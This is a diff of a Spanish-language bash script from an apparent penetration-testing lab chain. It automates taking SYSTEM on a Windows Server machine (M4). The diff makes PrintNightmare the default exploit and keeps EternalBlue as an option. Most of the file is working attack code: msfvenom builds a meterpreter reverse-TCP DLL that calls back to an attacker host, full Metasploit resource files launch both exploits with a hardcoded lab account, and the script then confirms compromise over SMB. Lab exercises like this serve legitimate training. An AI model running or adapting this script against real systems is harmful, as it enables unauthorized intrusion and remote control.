@@ -2,16 +2,17 @@
 # ============================================================================
 #  lab/chain/04-m3-to-m4.sh — salto 4: M3 (root) → M4 (SYSTEM)
 # ----------------------------------------------------------------------------
-#  Vulnerabilidad: MS17-010 (EternalBlue) sobre SMBv1 en Windows Server 2016
-#  sin parchear. SMB1 está habilitado a propósito en el instalador de M4.
-#  El exploit no usa credenciales: obtiene SYSTEM directo.
+#  Vulnerabilidad por defecto: PrintNightmare (CVE-2021-34527) en el spooler
+#  de M4, con la cuenta limitada `soporte`. Es la opción que SÍ cubre
+#  Windows Server 2016 build 14393.
 #
-#  Fallback documentado: PrintNightmare (CVE-2021-34527) con la cuenta
-#  limitada `soporte` si el build de M4 ya trae MS17-010.
+#  `--eternalblue` usa MS17-010, pero el módulo de Metasploit NO soporta
+#  14393: solo tiene sentido si M4 es Server 2012 R2 (build 9600).
 #
 #  Uso:
-#    bash lab/chain/04-m3-to-m4.sh            # imprime y verifica
-#    bash lab/chain/04-m3-to-m4.sh --run      # lanza Metasploit
+#    bash lab/chain/04-m3-to-m4.sh              # imprime y verifica
+#    bash lab/chain/04-m3-to-m4.sh --run        # PrintNightmare
+#    bash lab/chain/04-m3-to-m4.sh --eternalblue --run
 # ============================================================================
 
 set -euo pipefail
@@ -23,37 +24,57 @@ export LAB_REPO_DIR LAB_LOG
 LAB_ROLE=chain
 
 RUN=0
+MODE="printnightmare"
 WORK="${LAB_WORK:-${HOME:-/tmp}/lab-work}"
 LHOST="${LHOST:-$M6}"
 SHARE="${M4_SHARE:-Transfer}"
 MARKER="PWNED-M4.txt"
+PN_USER="${PN_USER:-soporte}"
+PN_PASS="${PN_PASS:-Soporte2026!}"
 
 while (($#)); do
   case "$1" in
     --run) RUN=1; shift ;;
-    -h|--help) echo "Uso: $0 [--run]"; exit 0 ;;
+    --eternalblue) MODE="eternalblue"; shift ;;
+    -h|--help) echo "Uso: $0 [--run] [--eternalblue]"; exit 0 ;;
     *) die "opción desconocida: $1" ;;
   esac
 done
 
 lab_banner
 step "salto 4 · M3 (${M3}, root) → M4 (${M4}, SYSTEM)"
-cat <<EOF
-Vulnerabilidad: MS17-010 / EternalBlue (SMBv1, CVE-2017-0144).
+
+if [[ "$MODE" == "printnightmare" ]]; then
+  cat <<EOF
+Vulnerabilidad: PrintNightmare (CVE-2021-34527) en el spooler de M4.
+Cuenta limitada del escenario: ${PN_USER}/${PN_PASS}.
+
+  nmap -Pn -p445,135,139 $M4
+  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f dll -o $WORK/pn.dll
+  msfconsole -q -r $WORK/pn.rc
+  smbclient //$M4/$SHARE -N -c 'get $MARKER'
+
+Si el módulo no aparece, dentro de msfconsole: search printnightmare
+EOF
+else
+  cat <<EOF
+Vulnerabilidad: MS17-010 / EternalBlue (solo Server 2012 R2 build 9600).
+En Windows Server 2016 (14393) el módulo de Metasploit aborta con
+"This exploit does not support this build": usar PrintNightmare.
 
   nmap -Pn -p445 --script smb-vuln-ms17-010 $M4
   msfconsole -q -r $WORK/ms17.rc
-
-  # el payload escribe el marcador en el share (Everyone), sin credenciales:
   smbclient //$M4/$SHARE -N -c 'get $MARKER'
-
-Fallback si el build ya trae el parche:
-  PrintNightmare (CVE-2021-34527) con la cuenta limitada soporte/Soporte2026!
 EOF
+fi
 
 step "verificación (nmap)"
 if command -v nmap >/dev/null 2>&1; then
-  nmap -Pn -p445 --script smb-vuln-ms17-010 "$M4" || warn "nmap falló"
+  if [[ "$MODE" == "eternalblue" ]]; then
+    nmap -Pn -p445 --script smb-vuln-ms17-010 "$M4" || warn "nmap falló"
+  else
+    nmap -Pn -p445,135,139 "$M4" || warn "nmap falló"
+  fi
 else
   warn "sin nmap; se omite la verificación"
 fi
@@ -64,25 +85,53 @@ if (( RUN == 0 )); then
   exit 0
 fi
 
-command -v msfconsole >/dev/null 2>&1 || die "falta msfconsole (paquete metasploit-framework)"
+command -v msfconsole >/dev/null 2>&1 || die "falta msfconsole (metasploit-framework)"
 mkdir -p "$WORK"
 
-step "recurso de Metasploit"
-cat > "$WORK/ms17.rc" <<EOF
+if [[ "$MODE" == "printnightmare" ]]; then
+  step "generando DLL del payload"
+  command -v msfvenom >/dev/null 2>&1 || die "falta msfvenom"
+  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="$LHOST" LPORT=4444 \
+    -f dll -o "$WORK/pn.dll" >/dev/null || die "msfvenom falló"
+  ok "DLL: $WORK/pn.dll"
+
+  step "recurso de Metasploit (PrintNightmare)"
+  cat > "$WORK/pn.rc" <<EOF
+use exploit/windows/dcerpc/cve_2021_1675_printnightmare
+set RHOSTS $M4
+set SMBUser $PN_USER
+set SMBPass $PN_PASS
+set SRVHOST $LHOST
+set DLL $WORK/pn.dll
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST $LHOST
+set LPORT 4444
+set ExitOnSession false
+exploit -z
+sleep 40
+sessions -l
+exit
+EOF
+  ok "recurso: $WORK/pn.rc"
+  step "lanzando PrintNightmare"
+  msfconsole -q -r "$WORK/pn.rc" || warn "msfconsole terminó con error"
+else
+  step "recurso de Metasploit (EternalBlue)"
+  cat > "$WORK/ms17.rc" <<EOF
 use exploit/windows/smb/ms17_010_eternalblue
 set RHOSTS $M4
 set RPORT 445
 set PAYLOAD windows/x64/exec
-set CMD cmd /c "whoami > C:\\\\$SHARE\\\\$MARKER & hostname >> C:\\\\$SHARE\\\\$MARKER & date /t >> C:\\\\$SHARE\\\\$MARKER"
+set CMD whoami > C:/$SHARE/$MARKER & hostname >> C:/$SHARE/$MARKER
 set ExitOnSession false
 exploit -z
-sleep 25
+sleep 120
 exit
 EOF
-ok "recurso: $WORK/ms17.rc"
-
-step "lanzando EternalBlue"
-msfconsole -q -r "$WORK/ms17.rc" || warn "msfconsole terminó con error"
+  ok "recurso: $WORK/ms17.rc"
+  step "lanzando EternalBlue"
+  msfconsole -q -r "$WORK/ms17.rc" || warn "msfconsole terminó con error"
+fi
 
 step "leyendo el marcador por SMB (sin credenciales)"
 if command -v smbclient >/dev/null 2>&1; then
@@ -91,12 +140,12 @@ if command -v smbclient >/dev/null 2>&1; then
   if [[ -s "$WORK/$MARKER" ]]; then
     cat "$WORK/$MARKER"
     grep -qi 'system' "$WORK/$MARKER" \
-      && ok "SYSTEM en M4 por MS17-010 (sin credenciales)" \
+      && ok "SYSTEM en M4 confirmado" \
       || warn "marcador leído, pero no dice SYSTEM"
   else
-    warn "sin marcador: puede que el build ya tenga MS17-010"
-    warn "fallback: PrintNightmare con soporte/Soporte2026! (ver README)"
+    warn "sin marcador por SMB anónimo."
+    warn "Alternativas: msfconsole > sessions -i 1 > getuid; o smbclient -U '$PN_USER%$PN_PASS'"
   fi
 else
-  warn "sin smbclient; revisar C:\\\\$SHARE\\\\$MARKER por WinRM o consola"
+  warn "sin smbclient; revisar C:/$SHARE/$MARKER por WinRM o consola"
 fi
